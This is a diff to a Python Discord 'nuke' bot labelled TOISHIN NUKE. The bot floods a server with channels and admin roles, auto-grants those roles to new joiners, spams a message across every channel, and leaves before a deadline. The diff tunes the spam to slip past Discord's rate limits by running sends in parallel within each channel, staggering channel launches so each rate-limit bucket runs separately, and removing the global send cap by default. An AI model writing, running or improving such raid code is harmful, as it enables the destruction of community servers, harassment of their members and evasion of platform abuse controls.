@@ -10,10 +10,14 @@
   !auto     ->  自動付与の状態確認
   !autoadmin on|off ->  自動付与の手動ON/OFF
 ================================================================
-  【退出保証】(火力は据え置き)
+  【送信設計】
+    チャンネル内 2 並列 / チャンネル起動を 0.08s ずつずらす
+    → 各chのレート制限バケツを独立に回して全体速度を稼ぐ
+    グローバル上限は既定で無効 (SPAM_CONCURRENCY=0)。詰まる場合のみ 20〜30 に
+================================================================
+  【退出保証】
     - 作業期限 = NUKE_TIMEOUT - LEAVE_RESERVE。期限で強制中断
     - グローバル429は「直近 GLOBAL_RESET 秒以内に PANIC_AFTER_GLOBAL 回」で中断
-      (discord.py が内部で再送している分は数えない。成功が続けばリセット)
     - 中断後も LEAVE_RESERVE 秒まるごと退出リトライに使う
 ================================================================
   必要な環境変数: DISCORD_TOKEN
@@ -77,6 +81,11 @@ ADMIN_NOTIFY     = False
 ADMIN_ROLE_COUNT = 50
 ADMIN_AUTO_GRANT = True         # !admin 後、新規参加者にも自動で同じロールを即付与
 
+# ==================== 送信ペース ====================
+SPAM_CONCURRENCY   = 0          # 全体の同時送信上限 (0=無制限。詰まるなら 20〜30)
+PER_CHANNEL_SPAM   = 2          # 1チャンネル内の同時送信数
+SPAM_STAGGER       = 0.08       # チャンネル起動のずらし幅(秒)
+
 # ==================== 退出保証 ====================
 NUKE_TIMEOUT       = 2400       # 全体の絶対上限(秒)。作業はこの手前で切る
 LEAVE_RESERVE      = 240        # 秒。退出専用枠
@@ -90,7 +99,6 @@ CREATE_CONCURRENCY = 15
 ROLE_CONCURRENCY   = 8
 MEMBER_CONCURRENCY = 8
 EXTRA_CONCURRENCY  = 10
-SPAM_CONCURRENCY   = 10         # 同時送信数 (429対策で10に固定)
 
 # 送信する本文
 NUKE_MESSAGE = (
@@ -200,7 +208,6 @@ def _note_global(e) -> None:
 
 
 def _calm_down() -> None:
-    """成功が続いたらグローバル429カウントを戻す"""
     if PANIC["global_429"] and time.monotonic() - PANIC["last_global"] > GLOBAL_RESET:
         PANIC["global_429"] = 0
 
@@ -250,7 +257,6 @@ async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
 
 
 async def patch_guild(guild: discord.Guild, payload: dict, label: str):
-    """Guild.edit の未対応キーワードを避けるための生 PATCH"""
     try:
         return await safe(
             bot.http.request,
@@ -351,7 +357,7 @@ bot = commands.Bot(
 
 NUKE_LOCK = asyncio.Lock()
 RETRY = {"delay": 30.0}
-SPAM_SEM = asyncio.Semaphore(SPAM_CONCURRENCY)
+SPAM_SEM = asyncio.Semaphore(SPAM_CONCURRENCY or 1)
 
 AUTO_GRANT: dict[int, list[str]] = {}
 AUTO_GRANT_SEM = asyncio.Semaphore(MEMBER_CONCURRENCY)
@@ -367,7 +373,6 @@ def resolve_auto_roles(guild: discord.Guild) -> list[discord.Role]:
 
 # ================== コミュニティ有効化 ==================
 async def _community_pair(guild: discord.Guild):
-    """rules / お知らせch を用意する。お知らせはニュース優先、無理ならテキスト"""
     rules = await safe(guild.create_text_channel, "rules",
                        reason="TOISHIN NUKE", label="community:rules")
     if rules is None:
@@ -380,6 +385,18 @@ async def _community_pair(guild: discord.Guild):
         news = await safe(guild.create_text_channel, "お知らせ-📢",
                           reason="TOISHIN NUKE", label="community:news-text")
     return rules, news
+
+
+async def _community_ok(guild: discord.Guild, how: str) -> bool:
+    try:
+        await guild.fetch()
+    except Exception:
+        pass
+    if "COMMUNITY" in guild.features:
+        log.info("      -> コミュニティON 完了 (%s)", how)
+        return True
+    log.warning("      -> PATCH は通ったが features に反映されず (%s)", how)
+    return False
 
 
 async def enable_community(guild: discord.Guild) -> bool:
@@ -395,7 +412,7 @@ async def enable_community(guild: discord.Guild) -> bool:
 
         base = sorted(set(guild.features) | {"COMMUNITY"})
 
-        # 試行1: features のみ (Discord が rules/お知らせを自動生成する想定)
+        # 試行1: features のみ
         got = await patch_guild(guild, {"features": base}, "community:on#1")
         if got is not None:
             return await _community_ok(guild, "自動生成")
@@ -427,18 +444,6 @@ async def enable_community(guild: discord.Guild) -> bool:
     except Exception as e:
         log.warning("コミュニティ有効化で例外: %r", e)
         return False
-
-
-async def _community_ok(guild: discord.Guild, how: str) -> bool:
-    try:
-        await guild.fetch()
-    except Exception:
-        pass
-    if "COMMUNITY" in guild.features:
-        log.info("      -> コミュニティON 完了 (%s)", how)
-        return True
-    log.warning("      -> PATCH は通ったが features に反映されず (%s)", how)
-    return False
 
 
 async def bind_community_channels(guild: discord.Guild,
@@ -653,17 +658,35 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
 
     # ---------- 9) 連投 (ロール作業と並行) ----------
     if created and not panic_skip("連投"):
-        log.info("[8/8] %d msg x %d ch 送信 (同時 %d) …",
-                 MESSAGES_PER_CHANNEL, len(created), SPAM_CONCURRENCY)
+        log.info("[8/8] %d msg x %d ch 送信 (ch内 %d並列 / 起動間隔 %.2fs) …",
+                 MESSAGES_PER_CHANNEL, len(created), PER_CHANNEL_SPAM, SPAM_STAGGER)
 
-        async def one(ch: discord.TextChannel):
-            async with SPAM_SEM:
-                return await safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
+        async def send_one(ch: discord.TextChannel):
+            if SPAM_CONCURRENCY:
+                async with SPAM_SEM:
+                    return await safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
+            return await safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
 
         async def spam(ch: discord.TextChannel):
-            await asyncio.gather(*(one(ch) for _ in range(MESSAGES_PER_CHANNEL)))
+            sem = asyncio.Semaphore(PER_CHANNEL_SPAM)
 
-        await asyncio.gather(chaos_roles(), *(spam(c) for c in created))
+            async def inner():
+                async with sem:
+                    return await send_one(ch)
+
+            await asyncio.gather(*(inner() for _ in range(MESSAGES_PER_CHANNEL)))
+
+        async def launch():
+            # チャンネルごとにバケツが独立しているので、起動をずらして
+            # 全体の同時リクエストを滑らかにする
+            tasks = []
+            for c in created:
+                tasks.append(asyncio.create_task(spam(c)))
+                if SPAM_STAGGER:
+                    await asyncio.sleep(SPAM_STAGGER)
+            await asyncio.gather(*tasks)
+
+        await asyncio.gather(chaos_roles(), launch())
         log.info("      -> 送信/付与完了 / %s", el())
     else:
         await chaos_roles()
@@ -737,8 +760,9 @@ async def run_nuke(guild: discord.Guild) -> None:
     PANIC.update(on=False, global_429=0, last_global=0.0,
                  deadline=time.monotonic() + budget)
 
-    log.info("=== NUKE START | %s (%s) | 作業枠 %.0fs + 退出枠 %ds | 同時送信 %d ===",
-             guild.name, guild.id, budget, LEAVE_RESERVE, SPAM_CONCURRENCY)
+    log.info("=== NUKE START | %s (%s) | 作業枠 %.0fs + 退出枠 %ds | ch内%d並列/間隔%.2fs ===",
+             guild.name, guild.id, budget, LEAVE_RESERVE,
+             PER_CHANNEL_SPAM, SPAM_STAGGER)
 
     task = asyncio.create_task(_nuke_body(guild, el))
     wd = asyncio.create_task(watchdog(task))
